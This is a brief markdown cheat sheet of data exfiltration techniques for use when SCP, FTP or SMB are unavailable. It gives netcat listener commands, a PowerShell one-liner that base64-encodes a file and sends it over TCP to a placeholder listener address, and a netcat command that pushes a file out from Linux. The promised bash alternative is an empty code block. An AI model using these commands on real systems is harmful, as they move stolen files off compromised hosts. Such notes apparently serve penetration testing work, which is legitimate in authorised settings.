# Data Exfiltration Techniques
## This is a list of some data exfiltration techniques if you don't have access to SCP, FTP, SMB, etc.
### Windows To Linux
Setup NetCat listener on Linux host:

```
nc -nlvp %ListeningPort% | base64 -d > file.ext
```

On the Windows host run the following in PowerShell:

```
$FilePath = "$pwd\file.ext"; $LHOST = "%ListenerAddress%"; $LPORT = %ListeningPort%; $Base64String = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("$FilePath")); $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $StreamWriter.Write($Base64String); $StreamWriter.Close(); $NetworkStream.Close(); $TCPClient.Close()
```

If not running from the same directory as the file location, then change ```$pwd\file.txt``` to the proper filepath.

### Linux To Linux
Setup NetCat listener on Linux host:

```
nc -nlvp port > file.ext
```

On the Linux host connect back with NetCat:

```
nc -q 0 %ListenerAddress% %ListeningPort% < file.ext 
```

If NetCat is unavailable, this can be done with bash:

```

```
